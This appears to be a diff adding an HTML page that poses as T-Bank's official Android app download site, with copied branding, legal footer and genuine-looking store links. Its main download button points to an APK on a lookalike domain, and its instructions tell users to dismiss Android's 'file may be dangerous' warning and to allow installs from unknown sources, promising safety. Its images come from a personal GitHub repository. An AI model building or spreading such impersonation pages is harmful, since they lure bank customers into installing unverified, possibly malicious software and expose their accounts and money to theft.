@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Скачайте приложение Т-Банка</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #f6f7f9;
+            color: #333;
+        }
+
+        /* Шапка сайта */
+        header {
+            background: #ffffff;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e8ecef;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        /* Обновленный логотип T20 (SVG) */
+        .logo-t20 {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            width: 54px;
+            height: 32px;
+        }
+
+        .header-buttons {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .lk-btn {
+            background: #f0f2f5;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+
+        .lk-btn:hover {
+            background: #e4e7eb;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            font-size: 22px;
+            cursor: pointer;
+            color: #333;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Плашка «Свежая версия» */
+        .version-badge {
+            background-color: #e3f2fd;
+            color: #0d47a1;
+            padding: 10px 16px;
+            font-size: 13px;
+            font-weight: 500;
+            text-align: center;
+            border-bottom: 1px solid #d0e3ff;
+        }
+
+        /* Контентная часть */
+        .wrapper {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+
+        /* Предупреждение (как на image_4.png) */
+        .warning-box {
+            background: #eef2f7;
+            border-radius: 16px;
+            padding: 16px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+
+        .warning-icon {
+            background: #2f80ed;
+            color: white;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .warning-text {
+            font-size: 14px;
+            color: #4a5568;
+            line-height: 1.4;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            color: #1a1a1a;
+            margin: 24px 0;
+            line-height: 1.2;
+        }
+
+        h2 {
+            font-size: 18px;
+            font-weight: 700;
+            text-align: center;
+            margin: 35px 0 15px 0;
+        }
+
+        /* Большой логотип-щит Т-Банка (центр страницы) */
+        .main-shield-container {
+            display: flex;
+            justify-content: center;
+            margin: 24px 0;
+        }
+
+        .shield-icon {
+            width: 130px;
+            height: 130px;
+        }
+
+        /* Список магазинов */
+        .store-card {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 18px;
+            margin-bottom: 12px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.03);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .store-info {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .store-logo {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            object-fit: contain;
+        }
+
+        .store-name {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+
+        .btn-link {
+            color: #2f80ed;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 15px;
+        }
+
+        /* Желтая кнопка «Скачать приложение» */
+        .download-button {
+            display: block;
+            background: #ffdd2d;
+            color: #000;
+            text-align: center;
+            padding: 16px;
+            border-radius: 14px;
+            font-weight: 600;
+            font-size: 16px;
+            text-decoration: none;
+            margin: 18px 0;
+            transition: background 0.2s;
+        }
+
+        .download-button:active {
+            background: #f5d020;
+        }
+
+        /* Изображения инструкций Android */
+        .instruction-image {
+            width: 100%;
+            border-radius: 16px;
+            margin: 12px 0;
+            display: block;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+
+        .instruction-desc {
+            font-size: 14px;
+            color: #555961;
+            text-align: center;
+            line-height: 1.4;
+            padding: 0 8px;
+            margin-bottom: 28px;
+        }
+
+        /* Тёмный подвал сайта */
+        footer {
+            background: #202124;
+            color: #9aa0a6;
+            padding: 32px 20px;
+            margin-top: 50px;
+            font-size: 13px;
+        }
+
+        .footer-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 28px;
+        }
+
+        .footer-item {
+            background: #303134;
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .phone-link {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            margin-top: 16px;
+            display: block;
+            text-decoration: none;
+        }
+
+        .phone-desc {
+            font-size: 12px;
+            color: #80868b;
+            margin-bottom: 12px;
+        }
+
+        .footer-legal {
+            margin-top: 24px;
+            border-top: 1px solid #3c4043;
+            padding-top: 16px;
+            line-height: 1.6;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Шапка сайта с логотипом Т20 -->
+    <header>
+        <div class="logo-t20" onclick="location.reload()">
+            <!-- SVG Оригинальный Т20 логотип -->
+            <svg viewBox="0 0 62 36" width="100%" height="100%">
+                <path d="M0 0h34l-5 23-12 11L5 23z" fill="#202124"/>
+                <path d="M9 7h16v4h-6v11h-4V11H9V7z" fill="#FFF"/>
+                <text x="34" y="24" font-family="Arial, sans-serif" font-weight="900" font-size="19" fill="#202124">20</text>
+            </svg>
+        </div>
+        <div class="header-buttons">
+            <a href="#" class="lk-btn" id="lkLink">Личный кабинет</a>
+            <button class="menu-btn" onclick="alert('Меню откроется после авторизации')">☰</button>
+        </div>
+    </header>
+
+    <!-- Твоя обязательная плашка версии приложения -->
+    <div class="version-badge">
+        У вас стоит свежая версия приложения
+    </div>
+
+    <div class="wrapper">
+        
+        <!-- Блок предупреждения безопасности -->
+        <div class="warning-box">
+            <div class="warning-icon">i</div>
+            <div class="warning-text">Не скачивайте приложения из непроверенных источников: это небезопасно</div>
+        </div>
+
+        <h1>Скачайте приложение<br>Т-Банка на Android</h1>
+
+        <!-- Большой жёлтый щит Т-Банка в центре -->
+        <div class="main-shield-container">
+            <svg class="shield-icon" viewBox="0 0 100 100">
+                <rect width="100" height="100" rx="24" fill="#FFDD2D"/>
+                <path d="M25 25h50l-7 34-18 16-18-16z" fill="#FFF"/>
+                <path d="M38 35h24v6h-9v17h-6V41h-9v-6z" fill="#000"/>
+            </svg>
+        </div>
+
+        <p style="text-align: center; font-weight: 600; color: #1a1a1a; margin-bottom: 20px;">Вариант 1. Скачайте в доступных магазинах приложений</p>
+
+        <!-- Кнопки магазинов с настоящими логотипами -->
+        <div class="store-card">
+            <div class="store-info">
+                <img src="https://www.rustore.ru/favicon.ico" alt="RuStore" class="store-logo">
+                <div class="store-name">RuStore</div>
+            </div>
+            <a href="#" class="btn-link" id="ruStoreLink">Скачать</a>
+        </div>
+
+        <div class="store-card">
+            <div class="store-info">
+                <img src="https://gcdn.apps.samsung.com/galaxy-store/fe/images/favicon.ico" alt="Galaxy Store" class="store-logo">
+                <div class="store-name">Galaxy Store</div>
+            </div>
+            <a href="#" class="btn-link" id="galaxyStoreLink">Скачать</a>
+        </div>
+
+        <div class="store-card">
+            <div class="store-info">
+                <img src="https://raw.githubusercontent.com/Artem0790YT/tbank/refs/heads/main/IMG_4037.png" alt="AppGallery" class="store-logo" style="background:#ce1a1a">
+                <div class="store-name">AppGallery</div>
+            </div>
+            <a href="#" class="btn-link" id="appGalleryLink">Скачать</a>
+        </div>
+
+        <!-- Вариант 2 (Прямое скачивание и инструкции с картинками) -->
+        <h2>Вариант 2. Скачайте приложение по кнопке</h2>
+        
+        <a href="#" class="download-button" id="directDownloadBtn">Скачать приложение Т-Банка</a>
+
+        <!-- Шаг 1: Предупреждение об опасности файла -->
+        <img src="https://raw.githubusercontent.com/Artem0790YT/tbank/refs/heads/main/IMG_4033.webp" alt="Уведомление Android" class="instruction-image">
+        <div class="instruction-desc">В случае уведомления «Файл может быть опасным» нажмите «Скачать». Гарантируем безопасность</div>
+
+        <!-- Шаг 2: Разрешение на установку -->
+        <img src="https://raw.githubusercontent.com/Artem0790YT/tbank/refs/heads/main/IMG_4035.webp" alt="Разрешение установки" class="instruction-image">
+        <div class="instruction-desc">Разрешить установку из этого источника в настройках вашего браузера</div>
+
+    </div>
+
+    <!-- Тёмный футер -->
+    <footer>
+        <div class="footer-grid">
+            <a href="#" class="footer-item" onclick="alert('О Т-Банке: Лицензия № 2673')">О Т-Банке</a>
+            <a href="#" class="footer-item" onclick="alert('Переход к новостям')">Новости</a>
+            <a href="#" class="footer-item" onclick="alert('Т-Блог')">Блог</a>
+            <a href="#" class="footer-item" onclick="alert('Вакансии компании')">Работа</a>
+            <a href="#" class="footer-item" onclick="alert('Поиск банкоматов на карте')">Банкоматы</a>
+            <a href="#" class="footer-item" onclick="alert('Служба поддержки')">Контакты</a>
+            <a href="#" class="footer-item" onclick="alert('Безопасность данных')">Безопасность</a>
+        </div>
+
+        <a href="tel:999" class="phone-link">999</a>
+        <div class="phone-desc">Короткий номер</div>
+
+        <a href="tel:88003333333" class="phone-link">8 800 333-33-33</a>
+        <div class="phone-desc">Бесплатно для звонков по России</div>
+
+        <div class="footer-legal">
+            © 2006—2026, АО «ТБанк», официальный сайт,<br>
+            универсальная лицензия ЦБ РФ № 2673
+        </div>
+    </footer>
+
+    <!-- НАСТРОЙКА ССЫЛОК И НАПРАВЛЕНИЙ КНОПОК -->
+    <script>
+        // 1. Ссылка для кнопки "Личный кабинет" (вставь свою ссылку сюда вместо #)
+        document.getElementById('lkLink').href = "https://www.tbank.ru/auth/login/";
+
+        // 2. Направление для кнопок магазинов приложений
+        document.getElementById('ruStoreLink').href = "https://www.rustore.ru/catalog/app/com.idamob.tinkoff.android";
+        document.getElementById('galaxyStoreLink').href = "https://galaxystore.samsung.com/detail/com.idamob.tinkoff.android";
+        document.getElementById('appGalleryLink').href = "https://appgallery.huawei.com/app/C101291451";
+
+        // 3. Ссылка на скачивание APK при нажатии на жёлтую кнопку
+        document.getElementById('directDownloadBtn').href = "https://acdn.t-bank-app.ru/download_apk/tbank_app.html";
+    </script>
+</body>
+</html>
